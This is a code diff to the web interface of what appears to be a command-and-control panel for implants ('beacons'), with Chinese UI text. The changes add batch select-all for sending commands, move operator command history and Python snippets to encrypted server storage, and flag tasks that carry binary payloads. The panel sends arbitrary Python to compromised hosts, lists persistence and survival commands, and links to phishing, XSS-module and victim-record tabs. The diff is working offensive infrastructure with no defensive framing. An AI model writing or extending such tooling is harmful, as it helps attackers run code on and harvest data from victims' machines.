@@ -52,6 +52,10 @@
                     <input type="text" id="beacon-search" class="form-control" placeholder="搜索 ID/用户/平台/tag/备注..."
                            style="flex:1;font-size:0.75rem;padding:5px 8px;font-family:var(--font-mono);" oninput="renderBeaconList()" aria-label="搜索 beacon">
                     <span class="help-text" style="margin:0;white-space:nowrap;" id="beacon-sel-info">已选 0</span>
+                    <button id="beacon-sel-all" class="btn btn-sm" onclick="toggleAllBeaconSel()"
+                            style="padding:1px 9px;font-size:0.68rem;white-space:nowrap;"
+                            title="选中/取消当前列表(含搜索过滤)里的全部 beacon"
+                            aria-label="批量全选 beacon">全选</button>
                 </div>
                 <div id="beacon-batch-bar" style="display:none;margin-bottom:8px;gap:6px;flex-wrap:wrap;align-items:center;">
                     <input type="text" id="batch-cmd" class="form-control" placeholder="批量命令(如 sysinfo / set_interval 10 0.2)"
@@ -140,7 +144,7 @@
                     </div>
                 </div>
                 <textarea id="py-code" class="editor-textarea" rows="10" spellcheck="false" aria-label="Python 代码"
-                    placeholder="Python 代码，将原样下发到选中 beacon 执行（等价于终端 raw 命令，支持多行）。片段保存在浏览器 localStorage。"></textarea>
+                    placeholder="Python 代码，将原样下发到选中 beacon 执行（等价于终端 raw 命令，支持多行）。片段库加密保存在服务端 web_app/state/。"></textarea>
                 <p class="help-text" style="margin:8px 0 0;">Tab 键插入缩进 · Ctrl+Enter 直接发送 · 结果回显到上方终端</p>
             </div>
         </div>
@@ -169,9 +173,10 @@
             <div class="card panel-history">
                 <div class="card-title">
                     <h3 style="margin:0;">历史命令</h3>
-                    <button class="btn btn-sm" onclick="clearHistory()" title="清空本地历史命令记录">清空</button>
+                    <span id="hist-status" class="help-text" style="margin-left:auto;margin-right:8px;font-size:0.68rem;"></span>
+                    <button class="btn btn-sm" onclick="clearHistory()" title="清空服务端历史命令记录">清空</button>
                 </div>
-                <p class="help-text" style="margin:8px 0;">终端执行过的命令(最多 20000 条, 存于 localStorage)。</p>
+                <p class="help-text" style="margin:8px 0;">终端执行过的命令(最多 20000 条, 加密存于服务端 web_app/state/, 不落浏览器)。</p>
                 <div id="history-list" class="auto-list" style="font-family:var(--font-mono);font-size:0.72rem;line-height:1.6;"></div>
             </div>
         </div>
@@ -910,7 +915,7 @@ const BUILTIN_CMD_DESC = {
     'reload': '重载模块',
     'uplevel': '切换上级会话',
     'help': '帮助',
-    'exit': '退出会话',
+    's_exit': '退出会话/关闭 Server(shell 模式退子 shell 用 exit)',
 };
 
 function descFor(name) {
@@ -1007,11 +1012,33 @@ function copyTerm() {
 }
 function flashBtnText(btn, t) { if (!btn) return; const o = btn.textContent; btn.textContent = t; setTimeout(() => btn.textContent = o, 1200); }
 
-// ── 历史命令（localStorage，↑/↓） ──
-let termHist = [];
-try { termHist = JSON.parse(localStorage.getItem('fs3_c2_history') || '[]'); } catch (e) { termHist = []; }
-let histIdx = termHist.length;
+// ── 历史命令(服务端加密落盘, ↑/↓) ──
+let termHist = [];        // 页面内存副本(仅供 ↑/↓ 与右栏展示, 不是存储)
+let histIdx = 0;
 let histDraft = '';
+
+function histStatus(msg, cls) {
+    const el = document.getElementById('hist-status');
+    if (!el) return;
+    el.textContent = msg || '';
+    el.style.color = cls === 'err' ? 'var(--danger, #e05252)' : '';
+}
+
+async function loadHistory() {
+    try {
+        const r = await fetch('/api/c2/state');
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        const d = await r.json();
+        termHist = Array.isArray(d.history) ? d.history : [];
+        histIdx = termHist.length;
+        histStatus('');
+        renderHistory();
+    } catch (e) {
+        termHist = [];
+        renderHistory();
+        histStatus('历史读取失败: ' + e.message, 'err');   // 如实标注, 不假装"没有历史"
+    }
+}
 const c2cmd = document.getElementById('c2-cmd');
 
 // 闪烁光标对齐 textarea 空态 caret 同 x(focus-within 会隐藏它, 聚焦后系统光标接管)
@@ -1034,10 +1061,15 @@ window.addEventListener('resize', alignTermCaret);
 function pushHistory(line) {
     termHist.push(line);
     if (termHist.length > 20000) termHist = termHist.slice(-20000);
-    localStorage.setItem('fs3_c2_history', JSON.stringify(termHist));
     histIdx = termHist.length;
     // 历史命令常驻右栏独立栏目——总是刷新
     renderHistory();
+    // 实时写服务端(加密落盘);失败必须看得见, 不静默丢弃
+    fetch('/api/c2/history', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({line: line})
+    }).then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); histStatus(''); })
+      .catch(function(e) { histStatus('⚠ 历史保存失败: ' + e.message, 'err'); });
 }
 
 function renderHistory() {
@@ -1064,16 +1096,23 @@ function syncHistHeight() {
     }
 }
 
-function clearHistory() {
+async function clearHistory() {
     if (!termHist.length) return;
     termHist = [];
     histIdx = 0;
-    localStorage.setItem('fs3_c2_history', '[]');
     renderHistory();
+    try {
+        const r = await fetch('/api/c2/history/clear', {method: 'POST'});
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        histStatus('');
+    } catch (e) {
+        histStatus('⚠ 清空失败: ' + e.message, 'err');
+        await loadHistory();          // 服务端没清掉 → 把真实状态拉回来
+    }
 }
 
-// 历史命令常驻左栏栏目——页面加载即渲染
-renderHistory();
+// 历史命令常驻左栏栏目——页面加载即拉取(服务端为准)
+loadHistory();
 
 // ── Tab 补全 ──
 let compState = null;
@@ -1258,7 +1297,7 @@ async function execCmd() {
 }
 
 // ── 危险命令识别(二次确认用) ──
-const DANGER_CMDS = ['kill', 'exit', 'persist', 'set_key', 'raw', 'reload', 'uplevel', 'break', 'set_host', 'survive', 's_exec'];
+const DANGER_CMDS = ['kill', 's_exit', 'persist', 'set_key', 'raw', 'reload', 'uplevel', 'break', 'set_host', 'survive', 's_exec'];
 function isDangerCmd(line) {
     const t = (line || '').trim().toLowerCase();
     if (!t) return false;
@@ -1814,6 +1853,16 @@ function updateSelInfo() {
     const n = Object.keys(selectedBeacons).length;
     document.getElementById('beacon-sel-info').textContent = '已选 ' + n;
     document.getElementById('beacon-batch-bar').style.display = n ? 'flex' : 'none';
+    // 全选按钮: 当前列表已全选 → 文案切"取消全选"; 列表空 → 禁用(不留死按钮)
+    const allBtn = document.getElementById('beacon-sel-all');
+    if (allBtn) {
+        const ids = beaconIds || [];
+        const allSel = ids.length > 0 && ids.every(function(id) { return !!selectedBeacons[id]; });
+        allBtn.textContent = allSel ? '取消全选' : '全选';
+        allBtn.disabled = ids.length === 0;
+        allBtn.title = allSel ? '取消选中当前列表全部 beacon'
+                              : '选中当前列表(含搜索过滤)里的全部 beacon';
+    }
 }
 
 // ── Beacon 拖拽排序(上下拖动改变列表顺序, localStorage 持久化)──
@@ -1893,6 +1942,18 @@ function toggleBeaconSel(bid) {
 
 function clearBeaconSel() {
     selectedBeacons = {};
+    updateSelInfo();
+    renderBeaconList();
+}
+
+// 批量全选: 作用于"当前列表"(beaconIds = 已按搜索框过滤、排除收纳态的可见 beacon)。
+// 全部已选时再点即取消全选(按钮文案随状态切换), 避免"选了没法一键撤"。
+function toggleAllBeaconSel() {
+    const ids = (beaconIds || []).slice();
+    if (!ids.length) { showNotice('当前列表没有可选的 beacon', false); return; }
+    const allSel = ids.every(function(id) { return !!selectedBeacons[id]; });
+    if (allSel) ids.forEach(function(id) { delete selectedBeacons[id]; });
+    else ids.forEach(function(id) { selectedBeacons[id] = true; });
     updateSelInfo();
     renderBeaconList();
 }
@@ -2084,15 +2145,23 @@ function renderBdTasks() {
     const box = document.getElementById('bd-tasks');
     if (!bdBeacon) return;
     const tasks = bdBeacon.tasks || [];
+    // 3A(2026-09-28):"已下发但结果未回收"的任务数(含服务端重启前下发的)——
+    // 提示一行, 避免这些任务静默消失(批量模式下 implant 未回连期间属正常)
+    const inFlight = (bdBeacon.in_flight || []).length;
+    const inFlightNote = inFlight
+        ? '<div style="padding:6px 10px;color:#fbbf24;">⚠ 有 ' + inFlight
+          + ' 个任务已下发但结果未回收(含服务端重启前下发的;批量模式下 implant 未回连期间属正常)</div>'
+        : '';
     if (!tasks.length) {
         // v2 批量模型: 任务一次性下发至 implant 本地队列,服务端队列下发即空
-        box.innerHTML = '<div style="padding:8px 10px;">（服务端无待办——批量模式下任务已一次性下发至 implant 本地队列，执行结果回连时带回）</div>';
+        box.innerHTML = inFlightNote + '<div style="padding:8px 10px;">（服务端无待办——批量模式下任务已一次性下发至 implant 本地队列，执行结果回连时带回）</div>';
         return;
     }
     bdTasksCache = tasks;
     const th = 'style="padding:5px 8px;border-bottom:1px solid var(--border);text-align:left;white-space:nowrap;font-weight:600;"';
     const td = 'style="padding:5px 8px;border-bottom:1px solid var(--border);vertical-align:top;"';
-    let html = '<table style="width:100%;border-collapse:collapse;font-size:0.72rem;">'
+    let html = inFlightNote
+        + '<table style="width:100%;border-collapse:collapse;font-size:0.72rem;">'
         + '<thead><tr>' + '<th ' + th + '>task_id</th><th ' + th + '>类型</th><th ' + th + '>创建时间</th>'
         + '<th ' + th + '>代码</th><th ' + th + '>操作</th></tr></thead><tbody>';
     tasks.forEach(function(t) {
@@ -2101,7 +2170,8 @@ function renderBdTasks() {
             + '<td ' + td + ' style="white-space:nowrap;" title="' + tid + '">' + tid.slice(0, 8) + '</td>'
             + '<td ' + td + ' style="white-space:nowrap;">' + (t.is_init ? '<span style="color:#fbbf24;">init</span>' : 'task') + '</td>'
             + '<td ' + td + ' style="white-space:nowrap;">' + fmtLocal(t.created_at) + '</td>'
-            + '<td ' + td + ' style="word-break:break-all;max-width:340px;">' + escapeHtml(t.code_preview || '') + '</td>'
+            + '<td ' + td + ' style="word-break:break-all;max-width:340px;">' + escapeHtml(t.code_preview || '')
+            + (t.binary ? ' <span style="color:#fbbf24;">[含二进制载荷]</span>' : '') + '</td>' 
             + '<td ' + td + ' style="white-space:nowrap;">'
             + '<button class="btn btn-sm" style="padding:0 7px;font-size:0.68rem;" onclick="editBdTask(\'' + t.task_id + '\')" title="修改任务代码">编辑</button> '
             + '<button class="btn btn-sm" style="padding:0 7px;font-size:0.68rem;" onclick="deleteBdTask(\'' + t.task_id + '\')" title="删除任务">删除</button>'
@@ -2114,9 +2184,13 @@ function renderBdTasks() {
 async function editBdTask(taskId) {
     const t = (bdTasksCache || []).find(function(x) { return x.task_id === taskId; });
     if (!t || !bdBeacon) return;
+    // 含 base64 大块的任务:后端已把 code 置空(不外发二进制),编辑框不预填,
+    // 输入内容将整条替换该任务 —— 避免把几百 KB 的 base64 刷到屏幕上
     const code = await fs3Prompt(
-        '修改任务 ' + t.task_id.slice(0, 8) + ' 的代码(完整替换, 下一个回连周期下发):',
-        t.code || t.code_preview || '', '任务代码', true);
+        '修改任务 ' + t.task_id.slice(0, 8) + ' 的代码'
+        + (t.binary ? '(该任务含二进制载荷 base64, 已隐藏;输入将整条替换)' : '')
+        + '(完整替换, 下一个回连周期下发):',
+        t.code || (t.binary ? '' : (t.code_preview || '')), '任务代码', true);
     if (code === null || code === undefined) return;  // 取消
     if (!String(code).trim()) { fs3Alert('代码不能为空'); return; }
     try {
@@ -2638,8 +2712,44 @@ pyCode.addEventListener('keydown', function(e) {
     }
 });
 
-function getSnippets() { try { return JSON.parse(localStorage.getItem('fs3_c2_snippets') || '[]'); } catch (e) { return []; } }
-function setSnippets(list) { localStorage.setItem('fs3_c2_snippets', JSON.stringify(list)); renderSnippets(); }
+// ── 代码片段库(服务端加密落盘) ──
+let snippetsCache = [];
+
+async function loadSnippets() {
+    const sel = document.getElementById('py-snippets');
+    try {
+        const r = await fetch('/api/c2/state');
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        const d = await r.json();
+        snippetsCache = Array.isArray(d.snippets) ? d.snippets : [];
+        if (sel) sel.title = '';
+        renderSnippets();
+    } catch (e) {
+        snippetsCache = [];
+        renderSnippets();
+        if (sel) sel.title = '片段库读取失败: ' + e.message;   // 如实标注
+    }
+}
+
+function getSnippets() { return snippetsCache; }   // 只读内存副本(渲染/载入用)
+
+async function saveSnippets(list, okMsg) {
+    try {
+        const r = await fetch('/api/c2/snippets', {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({snippets: list})
+        });
+        const d = await r.json().catch(function() { return {}; });
+        if (!r.ok) throw new Error(d.message || ('HTTP ' + r.status));
+        snippetsCache = d.snippets || [];
+        renderSnippets();
+        if (okMsg) fs3Alert(okMsg);
+        return true;
+    } catch (e) {
+        fs3Alert('片段保存失败: ' + e.message);
+        return false;
+    }
+}
 
 function renderSnippets() {
     const sel = document.getElementById('py-snippets');
@@ -2671,23 +2781,26 @@ function closeSnippetEdit() {
     snippetEditIdx = null;
 }
 
-function saveSnippetEdit() {
+async function saveSnippetEdit() {
     const name = document.getElementById('se-name').value.trim();
     const note = document.getElementById('se-note').value.trim();
     const code = document.getElementById('se-code').value;
     if (!name) { fs3Alert('片段名称不能为空'); return; }
     if (!code.trim()) { fs3Alert('片段代码不能为空'); return; }
     const list = getSnippets();
+    let idx;
     if (snippetEditIdx !== null && list[snippetEditIdx]) {
         list[snippetEditIdx] = {name: name, note: note, code: code};  // 编辑: 更新
+        idx = snippetEditIdx;
     } else {
         list.push({name: name, note: note, code: code});              // 新建: 追加
+        idx = list.length - 1;
     }
-    setSnippets(list);
-    const sel = document.getElementById('py-snippets');
-    if (snippetEditIdx !== null) sel.value = String(snippetEditIdx);
-    closeSnippetEdit();
-    fs3Alert('片段已保存: ' + name);
+    if (await saveSnippets(list, '片段已保存: ' + name)) {
+        const sel = document.getElementById('py-snippets');
+        if (sel) sel.value = String(idx);
+        closeSnippetEdit();
+    }
 }
 
 async function saveSnippet() {
@@ -2711,11 +2824,13 @@ async function editSnippet() {
 async function delSnippet() {
     const sel = document.getElementById('py-snippets');
     if (!sel.value) return;
+    const idx = parseInt(sel.value, 10);
     const list = getSnippets();
-    const name = list[parseInt(sel.value, 10)].name;
+    if (!list[idx]) return;
+    const name = list[idx].name;
     if (!(await fs3Confirm('删除片段 ' + name + ' ？'))) return;
-    list.splice(parseInt(sel.value, 10), 1);
-    setSnippets(list);
+    list.splice(idx, 1);
+    if (await saveSnippets(list, '片段已删除: ' + name)) sel.value = '';
 }
 
 function clearEditor() { pyCode.value = ''; }
@@ -3433,17 +3548,13 @@ async function clearWsHistoryAll() {
 }
 
 // ── 初始化 ──
-renderSnippets();
+loadSnippets();
 {% if tab == 'c2' %}loadStatus(); toggleAutoRefresh();{% elif tab == 'xss' %}loadPhStatus(); loadPhModules(); loadPhReports(); loadPhConfig(); loadPhLinks();{% elif tab == 'phishing' %}loadPhStatus(); loadPhPages(); loadPhDownloads(); loadPhLinks();{% else %}loadWsConnections();{% endif %}
 
 // ══════════════════════ 钓鱼页面(phishing) ══════════════════════
 var phTimer = null;
 var phSelectedModule = '';
 var phBuildResult = null;
-
-function phApiError(resp, fallback) {
-    return 'HTTP ' + resp.status + ': ' + (fallback || '');
-}
 
 function phShowError(msg) {
     var el = document.getElementById('ph-error');
@@ -3565,20 +3676,6 @@ async function togglePh() {
     } finally {
         btn.disabled = false;
     }
-}
-
-async function phStart() {
-    try {
-        var d = await phFetch('/api/phishing/start', {method: 'POST'});
-        loadPhStatus();
-    } catch (e) {}
-}
-
-async function phStop() {
-    try {
-        var d = await phFetch('/api/phishing/stop', {method: 'POST'});
-        loadPhStatus();
-    } catch (e) {}
 }
 
 async function phRestart() {
@@ -4108,15 +4205,6 @@ async function phSaveModule(filename, content) {
         fs3Alert(d.message || (d.ok ? '已保存' : '保存失败'));
         loadPhModules();
     } catch (e) { fs3Alert('保存失败'); }
-}
-
-async function phDeleteModule(name) {
-    if (!(await fs3Confirm('删除 JS 模块 ' + name + '.js?'))) return;
-    try {
-        var d = await phFetch('/api/phishing/module/' + encodeURIComponent(name + '.js'), {method: 'DELETE'});
-        fs3Alert(d.message || '已删除');
-        loadPhModules();
-    } catch (e) { fs3Alert('删除失败'); }
 }
 
 // ── 受害记录 ──
